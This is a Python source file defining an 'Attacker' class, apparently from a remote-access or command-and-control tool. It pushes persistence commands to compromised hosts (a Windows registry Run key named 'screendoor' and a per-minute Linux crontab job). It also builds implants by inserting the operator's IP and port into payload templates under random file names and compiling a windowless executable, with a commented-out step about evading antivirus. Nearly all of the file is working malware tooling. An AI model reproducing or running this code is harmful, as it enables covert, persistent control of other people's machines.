import os
import os.path
import shutil
import random
import string
import subprocess


class Attacker:
    def __init__(self):
        pass

    def persist(self, server, target_index):
        target = server.list_of_targets[target_index]
        print(f"\n[+] Setting up persistence for {target.fullname}...\n")
        selected_method_id = 0
        if "Windows" in target.os:
            while selected_method_id not in ["1", "2", "3"]:
                print("Available methods :")
                print("    1. Scheduling a task for vbs execution every five minutes.")
                print("    2. Adding a registry key for payload execution on system startup.")
                print("    3. Cancel.\n")
                selected_method_id = input("Enter the number of the method you want to use : ")
                print("")
            if selected_method_id == "1":
                self.persist_scheduled_task(server, target)
            elif selected_method_id == "2":
                self.persist_registry_key(server, target)
            elif selected_method_id == "3":
                print("Cancelling...\n")
        else:
            while selected_method_id not in ["1", "2"]:
                print("Available methods :")
                print("    1. Using crontab.")
                print("    2. Cancel.\n")
                selected_method_id = input("Enter the number of the method you want to use : ")
                print("")
            if selected_method_id == "1":
                self.persist_crontab(server, target)
            elif selected_method_id == "2":
                print("Cancelling...\n")

    def persist_scheduled_task(self, server, target):
        # TODO implement scheduled tasks persistence method
        print("[-] This method has not been implemented yet.\n")

    def persist_registry_key(self, server, target):
        # TODO handle automation of payload name variable + name errors
        payload_name = input("Enter payload name : ")
        try:
            persistence_command = f"cmd.exe /c copy {payload_name} C:\\Users\\Public"
            server.send_message(target.id, persistence_command)
            persistence_command = f"reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}"
            server.send_message(target.id, persistence_command)
            print("\n[+] Persistence achieved.\n")
            print("[!] Don't forget to run this command to clean up registry :")
            print("     \___ reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v screendoor /f\n")
        except Exception as err:
            print(f"[-] Error : {err}\n")

    def persist_crontab(self, server, target):
        # TODO handle automation of payload name variable + name errors
        payload_name = input("Enter payload name : ")
        try:
            persistence_command = f"cp {payload_name} /home/{target.user}/"
            server.send_message(target.id, persistence_command)
            persistence_command = f"echo '*/1 * * * * python3 /home/{target.user}/{payload_name}' | crontab -"
            server.send_message(target.id, persistence_command)
            print("\n[+] Persistence achieved.\n")
            print("[!] Don't forget to run this command to clean up the crontab :")
            print("     \___ crontab -r\n")
        except Exception as err:
            print(f"[-] Error : {err}\n")


    def winplant(self, server):
        random_chars = []
        for i in range(6):
            random_chars.append(str(random.choice(string.ascii_letters)))
            random_chars.append(str(random.choice(string.ascii_letters)))
            random_chars.append(str(random.randint(0,9)))
        random.shuffle(random_chars)
        random_file_name = "".join(random_chars) + ".py"
        cwd = os.getcwd()
        if os.path.exists(f"{cwd}\\src\\main\\templates\\winplant.txt"):
            shutil.copy(f"{cwd}\\src\\main\\templates\\winplant.txt", f"{cwd}\\tmp\\{random_file_name}")
            with open(f"{cwd}\\tmp\\{random_file_name}") as file:
                new_host = file.read().replace("INPUT_IP_HERE", str(server.host_ip))
                with open(f"{cwd}\\tmp\\{random_file_name}", "w") as file:
                    file.write(new_host)
                    file.close()
                with open(f"{cwd}\\tmp\\{random_file_name}") as file:
                    new_port = file.read().replace("INPUT_PORT_HERE", str(server.host_port))
                with open(f"{cwd}\\tmp\\{random_file_name}", "w") as file:
                    file.write(new_port)
                    file.close()
                if os.path.exists(f"{cwd}\\tmp\\{random_file_name}"):
                    print(f"[+] {random_file_name} saved to {cwd}\\tmp.\n")
                else:
                    print("[-] Couldn't create payload.")
        else:
            print("[-] winplant.txt file not found in current directory.\n")
    
    def linplant(self, server):
        random_chars = []
        for i in range(6):
            random_chars.append(str(random.choice(string.ascii_letters)))
            random_chars.append(str(random.choice(string.ascii_letters)))
            random_chars.append(str(random.randint(0,9)))
        random.shuffle(random_chars)
        random_file_name = ''.join(random_chars) + ".py"
        cwd = os.getcwd()
        if os.path.exists(f"{cwd}\\src\\main\\templates\\linplant.txt"):
            shutil.copy(f"{cwd}\\src\\main\\templates\\linplant.txt", f"{cwd}\\tmp\\{random_file_name}")
            with open(f"{cwd}\\tmp\\{random_file_name}") as file:
                new_host = file.read().replace("INPUT_IP_HERE", str(server.host_ip))
            with open(f"{cwd}\\tmp\\{random_file_name}", "w") as file:
                file.write(new_host)
                file.close()
            with open(f"{cwd}\\tmp\\{random_file_name}") as file:
                new_port = file.read().replace("INPUT_PORT_HERE", str(server.host_port))
            with open(f"{cwd}\\tmp\\{random_file_name}", "w") as file:
                file.write(new_port)
                file.close()
            if os.path.exists(f"{cwd}\\tmp\\{random_file_name}"):
                print(f"[+] {random_file_name} saved to {cwd}\\tmp.\n")
            else:
                print("[-] Couldn't create payload.")
        else:
            print("[-] linplant.txt file not found in current directory.\n")
    
    def exeplant(self, server):
        random_chars = []
        for i in range(6):
            random_chars.append(str(random.choice(string.ascii_letters)))
            random_chars.append(str(random.randint(0,9)))
        random.shuffle(random_chars)
        random_file_name = "".join(random_chars) + ".py"
        exe_file = "".join(random_chars) + ".exe"
        cwd = os.getcwd()
        if os.path.exists(f"{cwd}\\src\\main\\templates\\winplant.txt"):
            shutil.copy(f"{cwd}\\src\\main\\templates\\winplant.txt", f"{cwd}\\tmp\\{random_file_name}")
            with open(f"{cwd}\\tmp\\{random_file_name}") as file:
                new_host = file.read().replace("INPUT_IP_HERE", str(server.host_ip))
            with open(f"{cwd}\\tmp\\{random_file_name}", "w") as file:
                file.write(new_host)
                file.close()
            with open(f"{cwd}\\tmp\\{random_file_name}") as file:
                new_port = file.read().replace("INPUT_PORT_HERE", str(server.host_port))
            with open(f"{cwd}\\tmp\\{random_file_name}", "w") as file:
                file.write(new_port)
                file.close()
            pyinstaller_command = f"pyinstaller .\\tmp\\{random_file_name} -w --clean --onefile --distpath .\\tmp"
            print(f"[+] Compiling executable {exe_file}...")
            subprocess.call(pyinstaller_command, stderr=subprocess.DEVNULL)
            # print("[+] Taking 10s to bypass antivirus...")
            # time.sleep(10)
            os.remove(f"{random_file_name[0:-3]}.spec")
            shutil.rmtree("build")
            if os.path.exists(f"{cwd}\\tmp\\{exe_file}"):
                print(f"[+] {exe_file} saved to {cwd}\\tmp.\n")
            else:
                print("[-] An error occured during generaiton of exe file.\n")
        else:
            print("[-] Winplant.txt file not found in current directory.\n")
        

        
            